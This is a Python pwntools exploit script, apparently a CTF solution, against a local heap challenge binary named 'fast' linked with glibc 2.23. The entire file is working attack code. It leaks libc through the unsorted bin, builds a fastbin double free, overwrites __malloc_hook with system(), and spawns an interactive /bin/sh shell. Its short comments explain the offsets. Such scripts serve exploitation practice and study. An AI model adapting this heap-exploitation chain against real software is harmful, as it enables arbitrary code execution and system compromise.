#!/usr/bin/env python3
from pwn import *

# context(os='linux', arch='amd64')
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']

def create(size):
    p.sendlineafter(b'# ', '1')
    p.sendlineafter(b'size:\n', str(size))

def get(idx):
    p.sendlineafter(b'# ', '2')
    p.sendlineafter(b'idx:\n', str(idx))
    p.recvuntil(b']: ')
    return p.recvline()[:-1]

def set(idx, payload):
    p.sendlineafter(b'# ', '3')
    p.sendlineafter(b'idx:\n', str(idx))
    p.sendafter(b'str:', payload)

def delete(idx):
    p.sendlineafter(b'# ', '4')
    p.sendlineafter(b'idx:\n', str(idx))

def bye():
    p.sendlineafter(b'# ', '5')

def debug():
    gdb.attach(p)
    pause()

p = process('./fast')
libc = ELF('./libc-2.23.so')

# use unsorted bin to leak libc
create(0x80)# 0 进不到 top chunk
create(0x80)# 1 如果 free 这个就会直接进入 top chunk

delete(0)# 0x90 进入unsorted bin
create(0x80)# 2 拿出来 得到想要的 fd bk

unsortedbin_addr = u64(get(2).ljust(8,b'\x00'))
log.success('unsortedbin_addr: ' + hex(unsortedbin_addr))
libc.address = unsortedbin_addr - 0x3c4b78# 计算出libc基址 0x7ffff7dd1b78 - 0x7ffff7a0d000
log.success('libc_addr: ' + hex(libc.address))
system_addr = libc.symbols['system']
log.success('system_addr: ' + hex(system_addr))
# binsh_addr = next(libc.search(b'/bin/sh'))
# log.success('binsh_addr: ' + hex(binsh_addr))



# double free

create(0x60)# 3
create(0x60)# 4

delete(3)
delete(4)
delete(3)

# leak heap
create(0x60)# 5
heap_4 = u64(get(5).ljust(8,b'\x00'))
log.success('heap_4: ' + hex(heap_4))

delete(3)

__malloc_hook_s23h = libc.address + 0x3c4aed# __malloc_hook - 0x23 = 0x7ffff7dd1aed   malloc_hook = 0x7ffff7dd1b10
create(0x60)# 6 3
payload = p64(__malloc_hook_s23h)
set(6, payload)


create(0x60)# 7 4
create(0x60)# 8 3
create(0x60)# 9 __malloc_hook_s23h

payload = b'a'*0x13 + p64(system_addr)
set(9,payload)
# debug()
payload = b'/bin/sh\x00'
set(7,payload)
create(heap_4+0x10)

p.interactive()

